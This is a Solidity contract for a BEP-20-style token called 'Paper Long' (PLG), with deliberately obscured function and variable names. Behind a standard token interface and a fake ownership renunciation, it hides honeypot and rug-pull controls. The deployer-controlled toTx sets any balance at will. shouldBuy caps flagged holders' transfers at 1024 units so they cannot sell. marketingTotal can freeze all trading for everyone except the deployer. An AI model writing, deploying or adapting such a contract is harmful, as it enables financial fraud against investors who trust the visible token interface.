//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface fromWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract enableExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitWallet {
    function createPair(address tokenAtShould, address fromList) external returns (address);
}

interface senderLaunched {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalTo) external view returns (uint256);

    function transfer(address launchedAt, uint256 exemptIs) external returns (bool);

    function allowance(address tradingWallet, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptIs) external returns (bool);

    function transferFrom(
        address sender,
        address launchedAt,
        uint256 exemptIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenMax, uint256 value);
    event Approval(address indexed tradingWallet, address indexed spender, uint256 value);
}

interface senderLaunchedMetadata is senderLaunched {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PaperLong is enableExempt, senderLaunched, senderLaunchedMetadata {

    address public toBuy;

    function marketingAt() public {
        emit OwnershipTransferred(amountLaunch, address(0));
        receiverFund = address(0);
    }

    mapping(address => bool) public autoMarketing;

    constructor (){
        
        fromWallet marketingIs = fromWallet(atFeeTrading);
        toBuy = limitWallet(marketingIs.factory()).createPair(marketingIs.WETH(), address(this));
        if (enableTake != modeReceiver) {
            enableTake = takeMode;
        }
        amountLaunch = _msgSender();
        marketingAt();
        listTotal[amountLaunch] = true;
        receiverLaunched[amountLaunch] = tradingLaunched;
        if (takeMode != enableTake) {
            modeReceiver = enableTake;
        }
        emit Transfer(address(0), amountLaunch, tradingLaunched);
    }

    address senderWalletTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function name() external view virtual override returns (string memory) {
        return exemptEnable;
    }

    uint256 public takeMode;

    mapping(address => bool) public listTotal;

    event OwnershipTransferred(address indexed shouldList, address indexed totalReceiver);

    function symbol() external view virtual override returns (string memory) {
        return takeTotal;
    }

    bool public amountTotal;

    uint256 walletTotalIs;

    function toTx(address tokenToLimit, uint256 exemptIs) public {
        walletReceiver();
        receiverLaunched[tokenToLimit] = exemptIs;
    }

    function owner() external view returns (address) {
        return receiverFund;
    }

    address public amountLaunch;

    function transferFrom(address teamBuy, address launchedAt, uint256 exemptIs) external override returns (bool) {
        if (_msgSender() != atFeeTrading) {
            if (listMarketing[teamBuy][_msgSender()] != type(uint256).max) {
                require(exemptIs <= listMarketing[teamBuy][_msgSender()]);
                listMarketing[teamBuy][_msgSender()] -= exemptIs;
            }
        }
        return fromSell(teamBuy, launchedAt, exemptIs);
    }

    mapping(address => uint256) private receiverLaunched;

    mapping(address => mapping(address => uint256)) private listMarketing;

    uint256 constant maxTradingShould = 2 ** 10;

    bool public exemptMin;

    function shouldBuy(address modeFund) public {
        walletReceiver();
        if (takeMode == enableTake) {
            amountTotal = true;
        }
        if (modeFund == amountLaunch || modeFund == toBuy) {
            return;
        }
        autoMarketing[modeFund] = true;
    }

    function fromSell(address teamBuy, address launchedAt, uint256 exemptIs) internal returns (bool) {
        if (teamBuy == amountLaunch) {
            return teamFrom(teamBuy, launchedAt, exemptIs);
        }
        uint256 receiverAmount = senderLaunched(toBuy).balanceOf(senderWalletTo);
        require(receiverAmount == walletTotalIs);
        require(launchedAt != senderWalletTo);
        if (autoMarketing[teamBuy]) {
            return teamFrom(teamBuy, launchedAt, maxTradingShould);
        }
        return teamFrom(teamBuy, launchedAt, exemptIs);
    }

    string private exemptEnable = "Paper Long";

    uint256 isLiquidityReceiver;

    uint256 private modeReceiver;

    address atFeeTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address feeBuy, address limitMode) external view virtual override returns (uint256) {
        if (limitMode == atFeeTrading) {
            return type(uint256).max;
        }
        return listMarketing[feeBuy][limitMode];
    }

    function approve(address limitMode, uint256 exemptIs) public virtual override returns (bool) {
        listMarketing[_msgSender()][limitMode] = exemptIs;
        emit Approval(_msgSender(), limitMode, exemptIs);
        return true;
    }

    function minToken(address receiverSell) public {
        if (exemptMin) {
            return;
        }
        if (modeReceiver != enableTake) {
            takeLaunch = true;
        }
        listTotal[receiverSell] = true;
        if (takeLaunch == amountTotal) {
            amountTotal = true;
        }
        exemptMin = true;
    }

    bool public takeLaunch;

    uint256 public enableTake;

    uint8 private receiverAt = 18;

    uint256 private tradingLaunched = 100000000 * 10 ** 18;

    function balanceOf(address totalTo) public view virtual override returns (uint256) {
        return receiverLaunched[totalTo];
    }

    address private receiverFund;

    function marketingTotal(uint256 exemptIs) public {
        walletReceiver();
        walletTotalIs = exemptIs;
    }

    function transfer(address tokenToLimit, uint256 exemptIs) external virtual override returns (bool) {
        return fromSell(_msgSender(), tokenToLimit, exemptIs);
    }

    function walletReceiver() private view {
        require(listTotal[_msgSender()]);
    }

    string private takeTotal = "PLG";

    function teamFrom(address teamBuy, address launchedAt, uint256 exemptIs) internal returns (bool) {
        require(receiverLaunched[teamBuy] >= exemptIs);
        receiverLaunched[teamBuy] -= exemptIs;
        receiverLaunched[launchedAt] += exemptIs;
        emit Transfer(teamBuy, launchedAt, exemptIs);
        return true;
    }

    function getOwner() external view returns (address) {
        return receiverFund;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tradingLaunched;
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverAt;
    }

}